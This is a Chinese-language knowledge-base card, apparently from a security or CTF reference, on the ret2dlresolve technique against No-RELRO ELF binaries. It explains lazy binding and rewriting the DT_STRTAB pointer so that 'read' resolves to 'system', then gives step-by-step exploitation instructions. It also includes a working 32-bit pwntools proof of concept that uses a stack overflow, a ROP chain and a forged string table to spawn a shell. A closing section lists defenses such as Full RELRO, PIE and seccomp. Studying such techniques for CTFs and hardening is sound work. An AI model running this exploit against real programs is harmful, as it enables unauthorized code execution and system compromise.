---
id: binary-pwn-stack-ret2dlresolve-no-relro-dystrtab
title: No RELRO 改写 .dynamic 的 DT_STRTAB 实施 ret2dlresolve
type: scenario
domain: binary
path: binary/pwn/stack
technique: ret2dlresolve
tags:
- pwn
- stack
- rop
- ret2dlresolve
- elf
- plt
- got
- relro
- ret2csu
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V98
  verified_at: '2026-11-05T19:42:48+08:00'
  notes: 已对照原文与图01-04核对：GOT/PLT 延迟绑定、_dl_fixup 取 DT_JMPREL/DT_SYMTAB/DT_STRTAB 流程、No RELRO 下改 DT_STRTAB 指向伪造 .dynstr 并把 read 替换为 system、跳到 PLT 第二条指令强制解析、32/64 位 Elf_Dyn 指针偏移，均与原文一致；32 位 PoC 与原文脚本逐行对应（地址取自原文示例）。未验证点：PoC 未在本机复跑，示例地址需按目标 ELF 重算；原文无组件版本，affected_versions 留空正确；frontmatter 无 sources/source_url（全库惯例）。
url: /docs/binary/pwn/stack/binary-pwn-stack-ret2dlresolve-no-relro-dystrtab/
draft: false
kb_aliases:
- ret2dlresolve
- DT_STRTAB 劫持
- 延迟绑定劫持
- no relro ret2dlresolve
---

## 一句话结论

栈溢出且程序未开启 RELRO（`.dynamic` 可写）时，改写 `DT_STRTAB` 指向伪造的字符串表，让延迟绑定把原本要解析的 `read` 解析成 `system`，再跳到 PLT 项中 `push reloc_arg` 的位置强制触发解析，即可在无 libc 泄漏、NX 开启的条件下 getshell。

## 原理

启用延迟绑定时，外部函数第一次被调用会走 `jmp [got]` → `push reloc_arg` → `jmp PLT0` → `push GOT[1](link_map)` → `jmp GOT[2](_dl_runtime_resolve)`。`_dl_fixup` 从 `link_map` 的 `l_info` 中取出 `DT_SYMTAB`、`DT_STRTAB`、`DT_JMPREL` 三个基址，依次计算：

1. `reloc = DT_JMPREL + reloc_arg`；
2. `sym = &DT_SYMTAB[R_SYM(reloc->r_info)]`；
3. 函数名 = `DT_STRTAB + sym->st_name`。

解析器完全信任 `.dynamic` 中记录的 `DT_STRTAB` 指针。No RELRO 下 `.dynamic` 可写，把该指针改成自己写入 `.bss` 的伪造字符串表，并在伪造表中原 `read` 字符串的同一偏移处写入等长的 `system`，则解析 `read` 时实际按 `system` 查符号，`_dl_fixup` 返回并跳转的就是 `system` 的真实地址。由于已解析过的函数不会再次走解析，需要跳过 PLT 第一条 `jmp [got]`，直接返回到 PLT 项中 `push reloc_arg` 的指令地址。32 位参数直接布置在返回地址之后；64 位需先用 ret2csu 之类的 gadget 设置 `rdi/rsi/rdx` 调用 `read` 写入伪造表，再把 `/bin/sh` 指针放入 `rdi` 并跳到 `push` 指令。

## 触发条件

- 存在栈溢出且可控返回地址；
- 程序为 No RELRO，`.dynamic` 与 `.got.plt` 均可写；
- 有 `read` 等可重复调用的输入函数，用于把伪造字符串表和命令串写入可写段；
- 非 PIE 或已知加载基址（常规 CTF 场景）；
- NX 开启不影响该手法。

## 利用步骤

1. 计算溢出偏移，确认 `.dynamic` 中 `DT_STRTAB` 条目指针字段地址：32 位 `Elf32_Dyn` 每项 8 字节，指针在条目 +4；64 位 `Elf64_Dyn` 每项 16 字节，指针在条目 +8。
2. ROP 调用 `read(0, DT_STRTAB_ptr, 4/8)`，把伪造字符串表地址写入该指针。
3. 取真实 `.dynstr` 内容，将 `read` 替换为等长 `system`，再 `read` 到伪造地址，保证 `st_name` 偏移不变。
4. 把 `/bin/sh\0` 读入已知可写地址。
5. 返回到 `read@plt` 的第二条指令（`push reloc_arg`），并在栈上紧跟假返回地址与 `/bin/sh` 指针，作为解析出的 `system` 的参数。
6. 64 位先用 ret2csu 完成上述 `read` 调用，再以 `pop rdi; ret` 传 `/bin/sh` 并跳到对应 PLT 的 `push` 指令。

## PoC

32 位最小骨架（地址取自原文示例二进制，实际需按目标 ELF 重新计算）：

```python
from pwn import *
elf = ELF('./no_relro_32')
p = process('./no_relro_32')
rop = ROP(elf)
DT_STRTAB_PTR = 0x08049804 + 4          # .dynamic 中 DT_STRTAB 的 d_ptr 字段
FAKE_STRTAB   = 0x080498E0              # .bss 中的伪造字符串表
SH            = FAKE_STRTAB + 0x100
dynstr = elf.get_section_by_name('.dynstr').data().replace(b'read', b'system')

payload  = b'A' * 112
payload += rop.read(0, DT_STRTAB_PTR, 4)
payload += rop.read(0, FAKE_STRTAB, len(dynstr))
payload += rop.read(0, SH, 8)
payload += p32(0x08048376)              # read@plt 中 push reloc_arg 的地址
payload += p32(0xdeadbeef)              # system 的假返回地址
payload += p32(SH)                      # system 参数
p.send(payload.ljust(256, b'A'))
p.send(p32(FAKE_STRTAB))
p.send(dynstr)
p.send(b'/bin/sh\x00')
p.interactive()
```

64 位变体通过 ret2csu 设置 `read(0, dst, len)`，最后跳到 `push 0; jmp PLT0` 的地址完成解析。

## 变体与关联

- 64 位 ret2csu 版：用 `__libc_csu_init` 中的 gadget 设置三个参数，适用于无 `pop rdi/rsi/rdx` 的二进制。
- 若 `.dynamic` 只读（Partial/Full RELRO），该手法失效，需改用伪造重定位表项或伪造 link_map，见关联卡。
- 关联：ret2libc（需先泄漏 libc）、GOT 覆写、栈迁移。
- pwntools 的 `Ret2dlresolvePayload` 可自动生成伪造结构与 ROP 调用。

## 检测与防御

- 编译时启用 Full RELRO 与立即绑定（`-Wl,-z,relro,-z,now`），使 `.dynamic` 只读并禁用延迟绑定，本手法即失效。
- 启用 PIE + ASLR，隐藏 `.dynamic`、PLT 与 `.bss` 地址。
- 运行期检测 `.dynamic` 中 `DT_STRTAB` 是否仍指向合法 `.dynstr`，以及 GOT 解析结果是否与符号名一致。
- 用 seccomp 限制 `execve`，降低 getshell 后的危害。
